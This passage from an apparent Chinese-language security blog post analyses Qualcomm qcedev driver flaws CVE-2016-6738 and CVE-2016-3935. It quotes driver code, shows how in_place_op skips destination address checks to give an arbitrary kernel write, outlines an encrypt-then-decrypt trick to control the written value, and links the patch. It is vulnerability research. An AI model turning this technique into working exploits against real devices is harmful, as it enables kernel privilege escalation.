digest[QCEDEV_MAX_SHA_DIGEST];</span><br><span class="line">                uint32_t                        diglen;</span><br><span class="line">                uint8_t                         *authkey;</span><br><span class="line">                uint32_t                        authklen;</span><br><span class="line">                enum qcedev_sha_alg_enum        alg;</span><br><span class="line">                struct qcedev_sha_ctxt          ctxt;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>哈希运算服务的核心结构体是 struct qcedev_sha_op_req, 待处理数据存放在 data 数组里，entries 是待处理数据的份数，data_len 是总长度。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因 [^]"></a>漏洞成因 <a href="#top">[^]</a></h2><p><span id="cause"></span> </p>
<p>可以通过下面的方法获取本文的漏洞代码</p>
<pre><code>* git clone https://android.googlesource.com/kernel/msm.git
* git checkout android-msm-angler-3.10-nougat-mr2
* git checkout 6cc52967be8335c6f53180e30907f405504ce3dd drivers/crypto/msm/qcedev.c </code></pre><h3 id="CVE-2016-6738-漏洞成因"><a href="#CVE-2016-6738-漏洞成因" class="headerlink" title="CVE-2016-6738 漏洞成因 [^]"></a>CVE-2016-6738 漏洞成因 <a href="#top">[^]</a></h3><p><span id="CVE-2016-6738-cause"></span></p>
<p>现在，我们来看第一个漏洞 cve-2016-6738</p>
<p>介绍漏洞之前，先科普一下linux kernel 的两个小知识点</p>
<p>1) linux kernel 的用户态空间和内核态空间是怎么划分的？</p>
<p>简单来说，在一个进程的地址空间里，比 thread_info-&gt;addr_limit 大的属于内核态地址，比它小的属于用户态地址</p>
<p>2) linux kernel 用户态和内核态之间数据怎么传输？</p>
<p>不可以直接赋值或拷贝，需要使用规定的接口进行数据拷贝，主要是4个接口：</p>
<p><code>copy_from_user/copy_to_user/get_user/put_user</code></p>
<p>这4个接口会对目标地址进行合法性校验，比如：</p>
<p><code>copy_to_user =  access_ok + __copy_to_user</code>   // __copy_to_user 可以理解为是memcpy</p>
<p>下面看漏洞代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">qcedev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_ENC_REQ:</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_DEC_REQ:</span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_cipher_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.cipher_op_req,</span><br><span class="line">                                (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_cipher_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                qcedev_areq.op_type = QCEDEV_CRYPTO_OPER_CIPHER;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_cipher_params(&amp;qcedev_areq.cipher_op_req,</span><br><span class="line">                                podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">                err = qcedev_vbuf_ablk_cipher(&amp;qcedev_areq, handle);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                        <span class="keyword">return</span> err;</span><br><span class="line">                <span class="keyword">if</span> (__copy_to_user((<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        &amp;qcedev_areq.cipher_op_req,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_cipher_op_req)))</span><br><span class="line">                                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err:</span><br><span class="line">        debugfs_remove_recursive(_debug_dent);</span><br><span class="line">        <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当用户态通过 ioctl 函数进入 qcedev 驱动后，如果 command 是 <strong>QCEDEV_IOCTL_ENC_REQ</strong>（加密）或者 <strong>QCEDEV_IOCTL_DEC_REQ</strong>（解密），最后都会调用函数 <strong>qcedev_vbuf_ablk_cipher</strong> 进行处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_vbuf_ablk_cipher</span><span class="params">(struct qcedev_async_req *areq,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                struct qcedev_handle *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_cipher_op_req</span> *<span class="title">creq</span> = &amp;<span class="title">areq</span>-&gt;<span class="title">cipher_op_req</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Verify Source Address's */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; areq-&gt;cipher_op_req.entries; i++)</span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_READ,</span><br><span class="line">                        (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[i].vaddr,</span><br><span class="line">                                        areq-&gt;cipher_op_req.vbuf.src[i].len))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Verify Destination Address's */</span></span><br><span class="line">        <span class="keyword">if</span> (creq-&gt;in_place_op != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>, total = <span class="number">0</span>; i &lt; QCEDEV_MAX_BUFFERS; i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((areq-&gt;cipher_op_req.vbuf.dst[i].vaddr != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">                                                (total &lt; creq-&gt;data_len)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[i].vaddr,</span><br><span class="line">                                                creq-&gt;vbuf.dst[i].len)) &#123;</span><br><span class="line">                                        pr_err(<span class="string">"%s:DST WR_VERIFY err %d=0x%lx\n"</span>,</span><br><span class="line">                                                __func__, i, (<span class="keyword">uintptr_t</span>)</span><br><span class="line">                                                creq-&gt;vbuf.dst[i].vaddr);</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                                &#125;</span><br><span class="line">                                total += creq-&gt;vbuf.dst[i].len;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>, total = <span class="number">0</span>; i &lt; creq-&gt;entries; i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (total &lt; creq-&gt;data_len) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)creq-&gt;vbuf.src[i].vaddr,</span><br><span class="line">                                                creq-&gt;vbuf.src[i].len)) &#123;</span><br><span class="line">                                        pr_err(<span class="string">"%s:SRC WR_VERIFY err %d=0x%lx\n"</span>,</span><br><span class="line">                                                __func__, i, (<span class="keyword">uintptr_t</span>)</span><br><span class="line">                                                creq-&gt;vbuf.src[i].vaddr);</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                                &#125;</span><br><span class="line">                                total += creq-&gt;vbuf.src[i].len;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">        total = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (areq-&gt;cipher_op_req.data_len &gt; max_data_xfer) &#123;</span><br><span class="line">...</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">                err = qcedev_vbuf_ablk_cipher_max_xfer(areq, &amp;di, handle,</span><br><span class="line">...                                                             k_align_src);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 qcedev_vbuf_ablk_cipher 函数里，首先对 creq-&gt;vbuf.src 数组里的地址进行了校验，接下去它需要校验 creq-&gt;vbuf.dst 数组里的地址</p>
<p>这时候我们发现，当变量 <strong>creq-&gt;in_place_op</strong> 的值不等于 1 时，它才会校验 creq-&gt;vbuf.dst 数组里的地址，否则目标地址creq-&gt;vbuf.dst[i].vaddr 将不会被校验</p>
<p>这里的 <strong>creq-&gt;in_place_op</strong> 是一个用户层可以控制的值，如果后续代码对这个值没有要求，那么这里就可以通过让 <strong>creq-&gt;in_place_op = 1</strong> 来绕过对 creq-&gt;vbuf.dst[i].vaddr 的校验，这是一个疑似漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_vbuf_ablk_cipher_max_xfer</span><span class="params">(struct qcedev_async_req *areq,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">int</span> *di, struct qcedev_handle *handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">uint8_t</span> *k_align_src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">uint8_t</span> *k_align_dst = k_align_src;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_cipher_op_req</span> *<span class="title">creq</span> = &amp;<span class="title">areq</span>-&gt;<span class="title">cipher_op_req</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (areq-&gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)</span><br><span class="line">                byteoffset = areq-&gt;cipher_op_req.byteoffset;</span><br><span class="line"></span><br><span class="line">        user_src = (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].vaddr;</span><br><span class="line">        <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user((k_align_src + byteoffset),</span><br><span class="line">                                (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line">                                areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        k_align_src += byteoffset + areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; areq-&gt;cipher_op_req.entries; i++) &#123;</span><br><span class="line">                user_src =</span><br><span class="line">                        (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[i].vaddr;</span><br><span class="line">                <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user(k_align_src,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line">                                        areq-&gt;cipher_op_req.vbuf.src[i].len)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                k_align_src += areq-&gt;cipher_op_req.vbuf.src[i].len;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">while</span> (creq-&gt;data_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (creq-&gt;vbuf.dst[dst_i].len &lt;= creq-&gt;data_len) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; __copy_to_user(</span><br><span class="line">                                (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[dst_i].vaddr,</span><br><span class="line">                                        (k_align_dst + byteoffset),</span><br><span class="line">                                        creq-&gt;vbuf.dst[dst_i].len))</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                        k_align_dst += creq-&gt;vbuf.dst[dst_i].len +</span><br><span class="line">                                                byteoffset;</span><br><span class="line">                        creq-&gt;data_len -= creq-&gt;vbuf.dst[dst_i].len;</span><br><span class="line">                        dst_i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; __copy_to_user(</span><br><span class="line">                                (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[dst_i].vaddr,</span><br><span class="line">                                (k_align_dst + byteoffset),</span><br><span class="line">                                creq-&gt;data_len))</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                        k_align_dst += creq-&gt;data_len;</span><br><span class="line">                        creq-&gt;vbuf.dst[dst_i].len -= creq-&gt;data_len;</span><br><span class="line">                        creq-&gt;vbuf.dst[dst_i].vaddr += creq-&gt;data_len;</span><br><span class="line">                        creq-&gt;data_len = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        *di = dst_i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在函数 <strong>qcedev_vbuf_ablk_cipher_max_xfer</strong> 里，我们发现它没有再用到变量 <strong>creq-&gt;in_place_op</strong>， 也没有对地址 creq-&gt;vbuf.dst[i].vaddr 做校验，我们还可以看到该函数最后是使用 <strong>__copy_to_user</strong> 而不是 copy_to_user 从变量 k_align_dst 拷贝数据到地址 creq-&gt;vbuf.dst[i].vaddr</p>
<p>由于** <strong>copy_to_user** 本质上只是 memcpy, 且 **</strong>copy_to_user** 的目标地址是 creq-&gt;vbuf.dst[dst_i].vaddr, 这个地址可以被用户态控制， 这样漏洞就坐实了，我们得到了一个内核任意地址写漏洞。</p>
<p>接下去我们看一下能写什么值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="keyword">while</span> (creq-&gt;data_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (creq-&gt;vbuf.dst[dst_i].len &lt;= creq-&gt;data_len) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; __copy_to_user(</span><br><span class="line">                                (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[dst_i].vaddr,</span><br><span class="line">                                        (k_align_dst + byteoffset),</span><br><span class="line">                                        creq-&gt;vbuf.dst[dst_i].len))</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                        k_align_dst += creq-&gt;vbuf.dst[dst_i].len +</span><br><span class="line">                                                byteoffset;</span><br><span class="line">                        creq-&gt;data_len -= creq-&gt;vbuf.dst[dst_i].len;</span><br><span class="line">                        dst_i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<p>再看一下漏洞触发的地方，源地址是 <strong>k_align_dst</strong> ，这是一个局部变量，下面看这个地址的内容能否控制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_vbuf_ablk_cipher_max_xfer</span><span class="params">(struct qcedev_async_req *areq,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">int</span> *di, struct qcedev_handle *handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">uint8_t</span> *k_align_src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> dst_i = *di;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">        <span class="keyword">uint32_t</span> byteoffset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *user_src = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *k_align_dst = k_align_src;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_cipher_op_req</span> *<span class="title">creq</span> = &amp;<span class="title">areq</span>-&gt;<span class="title">cipher_op_req</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (areq-&gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)</span><br><span class="line">                byteoffset = areq-&gt;cipher_op_req.byteoffset;</span><br><span class="line"></span><br><span class="line">        user_src = (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].vaddr;</span><br><span class="line">        <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user((k_align_src + byteoffset), <span class="comment">// line 1160</span></span><br><span class="line">                                (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line">                                areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        k_align_src += byteoffset + areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len;</span><br></pre></td></tr></table></figure>

<p>在函数 <strong>qcedev_vbuf_ablk_cipher_max_xfer</strong> 的行 1160 可以看到，变量 <strong>k_align_dst</strong> 的值是从用户态地址拷贝过来的，可以被控制，但是，还没完</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1178</span>         <span class="comment">/* restore src beginning */</span></span><br><span class="line"><span class="number">1179</span>         k_align_src = k_align_dst;</span><br><span class="line"><span class="number">1180</span>         areq-&gt;cipher_op_req.data_len += byteoffset;</span><br><span class="line"><span class="number">1181</span> </span><br><span class="line"><span class="number">1182</span>         areq-&gt;cipher_req.creq.src = (struct scatterlist *) &amp;sg_src;</span><br><span class="line"><span class="number">1183</span>         areq-&gt;cipher_req.creq.dst = (struct scatterlist *) &amp;sg_src;</span><br><span class="line"><span class="number">1184</span> </span><br><span class="line"><span class="number">1185</span>         <span class="comment">/* In place encryption/decryption */</span></span><br><span class="line"><span class="number">1186</span>         sg_set_buf(areq-&gt;cipher_req.creq.src,</span><br><span class="line"><span class="number">1187</span>                                         k_align_dst,</span><br><span class="line"><span class="number">1188</span>                                         areq-&gt;cipher_op_req.data_len);</span><br><span class="line"><span class="number">1189</span>         sg_mark_end(areq-&gt;cipher_req.creq.src);</span><br><span class="line"><span class="number">1190</span> </span><br><span class="line"><span class="number">1191</span>         areq-&gt;cipher_req.creq.nbytes = areq-&gt;cipher_op_req.data_len;</span><br><span class="line"><span class="number">1192</span>         areq-&gt;cipher_req.creq.info = areq-&gt;cipher_op_req.iv;</span><br><span class="line"><span class="number">1193</span>         areq-&gt;cipher_op_req.entries = <span class="number">1</span>;</span><br><span class="line"><span class="number">1194</span> </span><br><span class="line"><span class="number">1195</span>         err = submit_req(areq, handle);</span><br><span class="line"><span class="number">1196</span> </span><br><span class="line"><span class="number">1197</span>         <span class="comment">/* copy data to destination buffer*/</span></span><br><span class="line"><span class="number">1198</span>         creq-&gt;data_len -= byteoffset;</span><br></pre></td></tr></table></figure>

<p>行1195调用函数 <strong>submit_req</strong> ，这个函数的作用是提交一个 buffer 给高通加解密引擎进行加解密，buffer 的设置由函数 <strong>sg_set_buf</strong> 完成，通过行 1186 可以看到，变量 <strong>k_align_dst</strong> 就是被传进去的 buffer , 经过这个操作后， 变量  <strong>k_align_dst</strong> 的值会被改变, 即我们通过__copy_to_user 传递给 creq-&gt;vbuf.dst[dst_i].vaddr 的值是被加密或者解密过一次的值。</p>
<p>那么我们怎么控制最终写到任意地址的那个值呢？</p>
<p>思路很直接，<code>我们将要写的值先用一个秘钥和算法加密一次，然后再用解密的模式触发漏洞，在漏洞触发过程中，会自动解密</code>，如下：</p>
<p>1) 假设我们最终要写的数据是A, 我们先选一个加密算法和key进行加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf = A</span><br><span class="line">op = QCEDEV_OPER_ENC  <span class="comment">// operation 为加密</span></span><br><span class="line">alg = QCEDEV_ALG_DES <span class="comment">// 算法</span></span><br><span class="line">mode = QCEDEV_DES_MODE_ECB</span><br><span class="line">key = xxx  <span class="comment">// 秘钥</span></span><br><span class="line"></span><br><span class="line">=&gt;  B</span><br></pre></td></tr></table></figure>
<p>2) 然后将B作为参数传入 <strong>qcedev_vbuf_ablk_cipher_max_xfer</strong> 函数触发漏洞，同时参数设置为解密操作，并且传入同样的解密算法和key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf = B</span><br><span class="line">op = QCEDEV_OPER_DEC <span class="comment">//// operation 为解密</span></span><br><span class="line">alg = QCEDEV_ALG_DES <span class="comment">// 一样的算法</span></span><br><span class="line">mode = QCEDEV_DES_MODE_ECB</span><br><span class="line">key = xxx <span class="comment">// 一样的秘钥</span></span><br><span class="line"></span><br><span class="line">=&gt; A</span><br></pre></td></tr></table></figure>
<p>这样的话，经过 <strong>submit_req</strong> 操作后， line 1204 得到的  k_align_dst 就是我们需要的数据。</p>
<p>至此，我们得到了一个<code>任意地址写任意值的漏洞</code>。</p>
<h3 id="CVE-2016-6738-漏洞补丁"><a href="#CVE-2016-6738-漏洞补丁" class="headerlink" title="CVE-2016-6738 漏洞补丁 [^]"></a>CVE-2016-6738 漏洞补丁 <a href="#top">[^]</a></h3><p><span id="CVE-2016-6738-patch"></span> </p>
<p>这个 <a href="https://source.codeaurora.org/quic/la//kernel/msm-3.18/commit/?id=0a2528569b035a2ca8ebe9a4612dbbaaaffa5b2e" target="_blank" rel="noopener">漏洞的修复</a> 很直观，将 <strong>in_place_op</strong> 的判断去掉了，对 creq-&gt;vbuf.src  和 creq-&gt;vbuf.dst 两个数组里的地址挨个进行 access_ok 校验</p>
<p>下面看第二个漏洞</p>
<h3 id="CVE-2016-3935-漏洞成因"><a href="#CVE-2016-3935-漏洞成因" class="headerlink" title="CVE-2016-3935 漏洞成因 [^]"></a>CVE-2016-3935 漏洞成因 <a href="#top">[^]</a></h3><p><span id="CVE-2016-3935-cause"></span></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">qcedev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_SHA_INIT_REQ:</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span 